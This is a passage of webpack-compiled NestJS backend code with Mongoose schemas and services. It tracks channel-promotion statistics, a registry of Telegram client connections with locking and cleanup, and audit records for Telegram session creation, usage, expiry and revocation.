    async deleteAll() {
        await this.promoteStatModel.deleteMany({}).exec();
    }
    async reinitPromoteStats() {
        const users = await this.findAll();
        for (const user of users) {
            await this.promoteStatModel.updateOne({ client: user.client }, {
                $set: {
                    totalCount: 0,
                    uniqueChannels: 0,
                    releaseDay: Date.now(),
                    lastUpdatedTimeStamp: Date.now(),
                    data: {}
                }
            });
        }
    }
};
exports.PromoteStatService = PromoteStatService;
exports.PromoteStatService = PromoteStatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(promote_stat_schema_1.PromoteStat.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        client_service_1.ClientService])
], PromoteStatService);


/***/ }),

/***/ "./src/components/promote-stats/schemas/promote-stat.schema.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/schemas/promote-stat.schema.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatSchema = exports.PromoteStat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let PromoteStat = class PromoteStat {
};
exports.PromoteStat = PromoteStat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteStat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    (0, mongoose_1.Prop)({ required: true, type: Map, of: Number }),
    __metadata("design:type", Map)
], PromoteStat.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], PromoteStat.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Last Updated TimeStamp' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    (0, mongoose_1.Prop)({ required: true, type: [String] }),
    __metadata("design:type", Array)
], PromoteStat.prototype, "channels", void 0);
exports.PromoteStat = PromoteStat = __decorate([
    (0, mongoose_1.Schema)()
], PromoteStat);
exports.PromoteStatSchema = mongoose_1.SchemaFactory.createForClass(PromoteStat);


/***/ }),

/***/ "./src/components/session-manager/client-registry.ts":
/*!***********************************************************!*\
  !*** ./src/components/session-manager/client-registry.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var ClientRegistry_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientRegistry = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const telegram_logger_1 = __webpack_require__(/*! ../Telegram/utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
let ClientRegistry = ClientRegistry_1 = class ClientRegistry {
    constructor() {
        this.clients = new Map();
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
        this.locks = new Map();
        this.LOCK_TIMEOUT = 30000;
        this.LOCK_EXPIRY = 120000;
        this.CLIENT_TIMEOUT = 300000;
        setInterval(() => this.cleanupInactiveClients(), 60000);
        setInterval(() => this.cleanupExpiredLocks(), 30000);
    }
    static getInstance() {
        if (!ClientRegistry_1.instance) {
            ClientRegistry_1.instance = new ClientRegistry_1();
        }
        return ClientRegistry_1.instance;
    }
    async acquireLock(mobile) {
        const lockId = `${mobile}_${Date.now()}_${Math.random()}`;
        const now = new Date();
        const existingLock = this.locks.get(mobile);
        if (existingLock) {
            if (now.getTime() - existingLock.acquired.getTime() > this.LOCK_EXPIRY) {
                this.locks.delete(mobile);
                this.logger.info(mobile, 'Removed expired lock');
            }
            else {
                this.logger.info(mobile, 'Lock already exists, waiting...');
                return null;
            }
        }
        this.locks.set(mobile, { acquired: now, lockId });
        this.logger.info(mobile, `Lock acquired: ${lockId}`);
        return lockId;
    }
    releaseLock(mobile, lockId) {
        const lock = this.locks.get(mobile);
        if (lock && lock.lockId === lockId) {
            this.locks.delete(mobile);
            this.logger.info(mobile, `Lock released: ${lockId}`);
            return true;
        }
        return false;
    }
    async waitForLock(mobile) {
        const startTime = Date.now();
        while (Date.now() - startTime < this.LOCK_TIMEOUT) {
            const lockId = await this.acquireLock(mobile);
            if (lockId) {
                return lockId;
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        throw new Error(`Lock acquisition timeout for ${mobile}`);
    }
    hasClient(mobile) {
        return this.clients.has(mobile);
    }
    getClientInfo(mobile) {
        return this.clients.get(mobile) || null;
    }
    async registerClient(mobile, client, sessionString, lockId) {
        const lock = this.locks.get(mobile);
        if (!lock || lock.lockId !== lockId) {
            throw new Error(`Invalid lock for registering client: ${mobile}`);
        }
        if (this.clients.has(mobile)) {
            this.logger.error(mobile, 'Client already exists, cannot register new one', new Error('Duplicate client'));
            return false;
        }
        const clientInfo = {
            client,
            mobile,
            sessionString,
            createdAt: new Date(),
            lastActivity: new Date(),
            isCreating: false,
            lockId
        };
        this.clients.set(mobile, clientInfo);
        this.logger.info(mobile, 'Client registered successfully');
        return true;
    }
    markClientCreating(mobile, lockId) {
        const lock = this.locks.get(mobile);
        if (!lock || lock.lockId !== lockId) {
            return false;
        }
        const existing = this.clients.get(mobile);
        if (existing) {
            existing.isCreating = true;
            existing.lastActivity = new Date();
            return true;
        }
        const clientInfo = {
            client: null,
            mobile,
            sessionString: '',
            createdAt: new Date(),
            lastActivity: new Date(),
            isCreating: true,
            lockId
        };
        this.clients.set(mobile, clientInfo);
        return true;
    }
    updateActivity(mobile) {
        const clientInfo = this.clients.get(mobile);
        if (clientInfo) {
            clientInfo.lastActivity = new Date();
        }
    }
    async removeClient(mobile, lockId) {
        const clientInfo = this.clients.get(mobile);
        if (!clientInfo) {
            return false;
        }
        if (lockId) {
            const lock = this.locks.get(mobile);
            if (!lock || lock.lockId !== lockId) {
                this.logger.error(mobile, 'Invalid lock for removing client', new Error('Invalid lock'));
                return false;
            }
        }
        if (clientInfo.client) {
            try {
                let tempClient = clientInfo.client;
                if (tempClient) {
                    try {
                        await tempClient.destroy();
                        tempClient._eventBuilders = [];
                        this.logger.info(mobile, 'Temporary client cleaned up');
                    }
                    catch (cleanupError) {
                        this.logger.error(mobile, 'Failed to cleanup temporary client', cleanupError);
                    }
                    finally {
                        if (tempClient) {
                            tempClient._destroyed = true;
                            if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {
                                await tempClient._sender.disconnect();
                            }
                            tempClient = null;
                        }
                    }
                }
                this.logger.info(mobile, 'Client disconnected during removal');
            }
            catch (error) {
                this.logger.error(mobile, 'Error disconnecting client during removal', error);
            }
        }
        this.clients.delete(mobile);
        this.logger.info(mobile, 'Client removed from registry');
        return true;
    }
    getActiveClientCount() {
        return this.clients.size;
    }
    getActivemobiles() {
        return Array.from(this.clients.keys());
    }
    async cleanupInactiveClients() {
        const now = new Date();
        const inactiveClients = [];
        for (const [mobile, clientInfo] of this.clients.entries()) {
            const inactiveTime = now.getTime() - clientInfo.lastActivity.getTime();
            if (inactiveTime > this.CLIENT_TIMEOUT) {
                inactiveClients.push(mobile);
            }
        }
        for (const mobile of inactiveClients) {
            this.logger.info(mobile, 'Removing inactive client');
            await this.removeClient(mobile);
        }
        if (inactiveClients.length > 0) {
            this.logger.info('SYSTEM', `Cleaned up ${inactiveClients.length} inactive clients`);
        }
    }
    cleanupExpiredLocks() {
        const now = new Date();
        const expiredLocks = [];
        for (const [mobile, lock] of this.locks.entries()) {
            const lockAge = now.getTime() - lock.acquired.getTime();
            if (lockAge > this.LOCK_EXPIRY) {
                expiredLocks.push(mobile);
            }
        }
        for (const mobile of expiredLocks) {
            this.locks.delete(mobile);
            this.logger.info(mobile, 'Removed expired lock');
        }
        if (expiredLocks.length > 0) {
            this.logger.info('SYSTEM', `Cleaned up ${expiredLocks.length} expired locks`);
        }
    }
    async forceCleanup(mobile) {
        let cleanedCount = 0;
        if (this.locks.has(mobile)) {
            this.locks.delete(mobile);
            cleanedCount++;
        }
        if (await this.removeClient(mobile)) {
            cleanedCount++;
        }
        this.logger.info(mobile, `Force cleanup completed, removed ${cleanedCount} items`);
        return cleanedCount;
    }
    getStats() {
        return {
            activeClients: this.clients.size,
            activeLocks: this.locks.size,
            mobiles: Array.from(this.clients.keys())
        };
    }
};
exports.ClientRegistry = ClientRegistry;
ClientRegistry.instance = null;
exports.ClientRegistry = ClientRegistry = ClientRegistry_1 = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [])
], ClientRegistry);


/***/ }),

/***/ "./src/components/session-manager/index.ts":
/*!*************************************************!*\
  !*** ./src/components/session-manager/index.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./session.service */ "./src/components/session-manager/session.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./session.controller */ "./src/components/session-manager/session.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./session.module */ "./src/components/session-manager/session.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./client-registry */ "./src/components/session-manager/client-registry.ts"), exports);
__exportStar(__webpack_require__(/*! ./session-audit.service */ "./src/components/session-manager/session-audit.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts"), exports);


/***/ }),

/***/ "./src/components/session-manager/schemas/sessions.schema.ts":
/*!*******************************************************************!*\
  !*** ./src/components/session-manager/schemas/sessions.schema.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionAuditSchema = exports.SessionAudit = exports.SessionCreationMethod = exports.SessionStatus = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
var SessionStatus;
(function (SessionStatus) {
    SessionStatus["CREATED"] = "created";
    SessionStatus["ACTIVE"] = "active";
    SessionStatus["EXPIRED"] = "expired";
    SessionStatus["REVOKED"] = "revoked";
    SessionStatus["FAILED"] = "failed";
})(SessionStatus || (exports.SessionStatus = SessionStatus = {}));
var SessionCreationMethod;
(function (SessionCreationMethod) {
    SessionCreationMethod["OLD_SESSION"] = "old_session";
    SessionCreationMethod["USER_MOBILE"] = "user_mobile";
    SessionCreationMethod["INPUT_SESSION"] = "input_session";
})(SessionCreationMethod || (exports.SessionCreationMethod = SessionCreationMethod = {}));
let SessionAudit = class SessionAudit {
};
exports.SessionAudit = SessionAudit;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'Phone number associated with the session' }),
    (0, mongoose_1.Prop)({ required: true, index: true }),
    __metadata("design:type", String)
], SessionAudit.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==...', description: 'Encrypted session string' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "sessionString", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Current status of the session', enum: SessionStatus }),
    (0, mongoose_1.Prop)({ required: true, enum: SessionStatus, default: SessionStatus.CREATED }),
    __metadata("design:type", String)
], SessionAudit.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'old_session', description: 'Method used to create the session', enum: SessionCreationMethod }),
    (0, mongoose_1.Prop)({ required: true, enum: SessionCreationMethod }),
    __metadata("design:type", String)
], SessionAudit.prototype, "creationMethod", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Session created successfully', description: 'Creation success/failure message' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "creationMessage", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==...', description: 'Previous session string used for creation (if applicable)' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "previousSessionString", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T10:00:00Z', description: 'When the session was created' }),
    (0, mongoose_1.Prop)({ default: Date.now }),
    __metadata("design:type", Date)
], SessionAudit.prototype, "createdAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T15:30:00Z', description: 'Last time the session was used' }),
    (0, mongoose_1.Prop)({ default: Date.now }),
    __metadata("design:type", Date)
], SessionAudit.prototype, "lastUsedAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2024-01-01T10:00:00Z', description: 'When the session expires' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Date)
], SessionAudit.prototype, "expiresAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID associated with this session' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username associated with this session' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 3, description: 'Number of retry attempts during creation' }),
    (0, mongoose_1.Prop)({ default: 0 }),
    __metadata("design:type", Number)
], SessionAudit.prototype, "retryAttempts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Rate limit exceeded', description: 'Error message if creation failed' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "errorMessage", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: { userAgent: 'Telegram-Desktop/1.0', ipAddress: '192.168.1.1' },
        description: 'Additional metadata about session creation'
    }),
    (0, mongoose_1.Prop)({ type: Object }),
    __metadata("design:type", Object)
], SessionAudit.prototype, "metadata", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Whether this session is currently active' }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], SessionAudit.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T16:00:00Z', description: 'When the session was revoked/expired' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Date)
], SessionAudit.prototype, "revokedAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'manual_revocation', description: 'Reason for session revocation' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "revocationReason", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 5, description: 'Number of times this session has been used' }),
    (0, mongoose_1.Prop)({ default: 0 }),
    __metadata("design:type", Number)
], SessionAudit.prototype, "usageCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'session_validation_failed', description: 'Last known error with this session' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "lastError", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T15:45:00Z', description: 'When the last error occurred' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Date)
], SessionAudit.prototype, "lastErrorAt", void 0);
exports.SessionAudit = SessionAudit = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'session_audits',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
                delete ret.__v;
            },
        },
    })
], SessionAudit);
exports.SessionAuditSchema = mongoose_1.SchemaFactory.createForClass(SessionAudit);
exports.SessionAuditSchema.index({ mobile: 1, createdAt: -1 });
exports.SessionAuditSchema.index({ status: 1, isActive: 1 });
exports.SessionAuditSchema.index({ createdAt: -1 });
exports.SessionAuditSchema.index({ lastUsedAt: -1 });
exports.SessionAuditSchema.index({ mobile: 1, isActive: 1, status: 1 });
exports.SessionAuditSchema.pre('findOneAndUpdate', function () {
    const update = this.getUpdate();
    if (update.$set && !update.$set.lastUsedAt) {
        update.$set.lastUsedAt = new Date();
    }
});


/***/ }),

/***/ "./src/components/session-manager/session-audit.service.ts":
/*!*****************************************************************!*\
  !*** ./src/components/session-manager/session-audit.service.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionAuditService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const sessions_schema_1 = __webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts");
const telegram_logger_1 = __webpack_require__(/*! ../Telegram/utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
let SessionAuditService = class SessionAuditService {
    constructor(sessionAuditModel) {
        this.sessionAuditModel = sessionAuditModel;
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
    }
    async createAuditRecord(createDto) {
        try {
            this.logger.info(createDto.mobile, 'Creating session audit record');
            const sessionAudit = new this.sessionAuditModel({
                ...createDto,
                status: sessions_schema_1.SessionStatus.CREATED,
                createdAt: new Date(),
                lastUsedAt: new Date(),
                usageCount: 0,
                isActive: true
            });
            const savedRecord = await sessionAudit.save();
            this.logger.info(createDto.mobile, `Session audit record created with ID: ${savedRecord.id}`);
            return savedRecord;
        }
        catch (error) {
            this.logger.error(createDto.mobile, 'Failed to create session audit record', error);
            throw error;
        }
    }
    async updateAuditRecord(mobile, sessionString, updateDto) {
        try {
            this.logger.info(mobile, 'Updating session audit record');
            const updateData = {
                ...updateDto,
                lastUsedAt: new Date()
            };
            const query = { mobile, isActive: true };
            if (sessionString) {
                query.sessionString = sessionString;
            }
            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(query, { $set: updateData }, { new: true, sort: { createdAt: -1 } });
            if (updatedRecord) {
                this.logger.info(mobile, `Session audit record updated: ${updatedRecord.id}`);
            }
            else {
                this.logger.info(mobile, 'No active session audit record found to update');
            }
            return updatedRecord;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to update session audit record', error);
            throw error;
        }
    }
    async markSessionUsed(mobile, sessionString) {
        try {
            const query = { mobile, isActive: true };
            if (sessionString) {
                query.sessionString = sessionString;
            }
            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(query, {
                $inc: { usageCount: 1 },
                $set: { lastUsedAt: new Date() }
            }, { new: true, sort: { createdAt: -1 } });
            if (updatedRecord) {
                this.logger.info(mobile, `Session usage recorded: count ${updatedRecord.usageCount}`);
            }
            return updatedRecord;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to mark session as used', error);
            throw error;
        }
    }
    async markSessionFailed(mobile, sessionString, errorMessage) {
        try {
            return await this.updateAuditRecord(mobile, sessionString, {
                status: sessions_schema_1.SessionStatus.FAILED,
                errorMessage,
                lastError: errorMessage,
                isActive: false
            });
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to mark session as failed', error);
            throw error;
        }
    }
    async revokeSession(mobile, sessionString, reason = 'manual_revocation') {
        try {
            return await this.updateAuditRecord(mobile, sessionString, {
                status: sessions_schema_1.SessionStatus.REVOKED,
                revocationReason: reason,
                revokedAt: new Date(),
                isActive: false
            });
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to revoke session', error);
            throw error;
        }
    }
    async getSessionsFormobile(mobile, activeOnly = false) {
        try {
            const query = { mobile };
            if (activeOnly) {
                query.isActive = true;
            }
            const sessions = await this.sessionAuditModel
                .find(query)
                .sort({ createdAt: -1 })
                .exec();
            this.logger.info(mobile, `Retrieved ${sessions.length} session records`);
            return sessions;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to get sessions for phone number', error);
            throw error;
        }
    }
    async getLatestActiveSession(mobile) {
        try {
            const session = await this.sessionAuditModel
                .findOne({ mobile, isActive: true })
                .sort({ createdAt: -1 })
                .exec();
            if (session) {
                this.logger.info(mobile, `Latest active session found: ${session.id}`);
            }
            return session;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to get latest active session', error);
            throw error;
        }
    }
    async querySessionAudits(queryDto) {
        try {
            const { mobile, status, creationMethod, isActive, limit = 20, offset = 0, startDate, endDate } = queryDto;
            const query = {};
            if (mobile)
                query.mobile = mobile;
            if (status)
                query.status = status;
            if (creationMethod)
                query.creationMethod = creationMethod;
            if (isActive !== undefined)
                query.isActive = isActive;
            if (startDate || endDate) {
                query.createdAt = {};
                if (startDate)
                    query.createdAt.$gte = startDate;
                if (endDate)
                    query.createdAt.$lte = endDate;
            }
            const [sessions, total] = await Promise.all([
                this.sessionAuditModel
                    .find(query)
                    .sort({ createdAt: -1 })
                    .skip(offset)
                    .limit(limit)
                    .exec(),
                this.sessionAuditModel.countDocuments(query)
            ]);
            this.logger.info('system', `Session audit query returned ${sessions.length} of ${total} records`);
            return {
                sessions,
                total,
                page: Math.floor(offset / limit) + 1,
                limit
            };
        }
        catch (error) {
            this.logger.error('system', 'Failed to query session audits', error);
            throw error;
        }
    }
    async getSessionStats(mobile, days = 30) {
        try {
            const startDate = new Date();
            startDate.setDate(startDate.getDate() - days);
            const query = { createdAt: { $gte: startDate } };
            if (mobile) {
                query.mobile = mobile;
            }
            const stats = await this.sessionAuditModel.aggregate([
                { $match: query },
                {
                    $group: {
                        _id: null,
                        totalSessions: { $sum: 1 },
                        activeSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.ACTIVE] }, 1, 0] }
                        },
                        expiredSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.EXPIRED] }, 1, 0] }
                        },
                        revokedSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.REVOKED] }, 1, 0] }
                        },
                        failedSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.FAILED] }, 1, 0] }
                        }
                    }
                }
            ]);
            const methodBreakdown = await this.sessionAuditModel.aggregate([
                { $match: query },
                {
                    $group: {
                        _id: '$creationMethod',
                        count: { $sum: 1 }
                    }
                }
            ]);
            const baseStats = stats[0] || {
                totalSessions: 0,
                activeSessions: 0,
                expiredSessions: 0,
                revokedSessions: 0,
                failedSessions: 0
            };
            const creationMethodBreakdown = {};
            methodBreakdown.forEach(item => {
                creationMethodBreakdown[item._id] = item.count;
            });
            const result = {
                ...baseStats,
                creationMethodBreakdown,
                dateRange: {
                    start: startDate,
                    end: new Date()
                }
            };
            this.logger.info(mobile || 'system', `Session stats retrieved: ${result.totalSessions} total sessions`);
            return result;
        }
        catch (error) {
            this.logger.error(mobile || 'system', 'Failed to get session stats', error);
            throw error;
        }
    }
    async cleanupOldSessions(days = 90) {
        try {
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - days);
            const result = await this.sessionAuditModel.deleteMany({
                createdAt: { $lt: cutoffDate },
                isActive: false
            });
            this.logger.info('system', `Cleaned up ${result.deletedCount} old session records`);
            return { deletedCount: result.deletedCount };
        }
        catch (error) {
            this.logger.error('system', 'Failed to cleanup old sessions', error);
            throw error;
        }
    }
    async findRecentSessions(mobile) {
        try {
            const tenDaysAgo = new Date();
            tenDaysAgo.setDate(tenDaysAgo.getDate() - 10);
            tenDaysAgo.setHours(0, 0, 0, 0);
            const recentSessions = await this.sessionAuditModel
                .find({
                mobile,
                isActive: true,
                status: { $in: [sessions_schema_1.SessionStatus.ACTIVE, sessions_schema_1.SessionStatus.CREATED] },
                $or: [
                    { lastUsedAt: { $gte: tenDaysAgo } },
                    {
                        lastUsedAt: { $exists: false },
                        createdAt: { $gte: tenDaysAgo }
                    }
                ]
            })
                .sort({ lastUsedAt: -1, createdAt: -1 })
                .exec();
            return recentSessions;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to find valid session from last 10 days', error);
            throw error;
        }
    }
    async markExpiredSessions(inactiveDays = 7) {
        try {
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - inactiveDays);
            const result = await this.sessionAuditModel.updateMany({
                lastUsedAt: { $lt: cutoffDate },
                status: { $in: [sessions_schema_1.SessionStatus.CREATED, sessions_schema_1.SessionStatus.ACTIVE] },
                isActive: true
            }, {
                $set: {
                    status: sessions_schema_1.SessionStatus.EXPIRED,
                    isActive: false,
                    revokedAt: new Date(),
                    revocationReason: 'auto_expired_due_to_inactivity'
                }
            });
            this.logger.info('system', `Marked ${result.modifiedCount} sessions as expired`);
            return { modifiedCount: result.modifiedCount };
        }
        catch (error) {
            this.logger.error('system', 'Failed to mark expired sessions', error);
            throw error;
        }
    }
};
exports.SessionAuditService = SessionAuditService;
exports.SessionAuditService = SessionAuditService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(sessions_schema_1.SessionAudit.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], SessionAuditService);


/***/ }),

/***/ "./src/components/session-manager/session.controller.ts":
/*!**************************************************************!*\
  !*** ./src/components/session-manager/session.controller.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
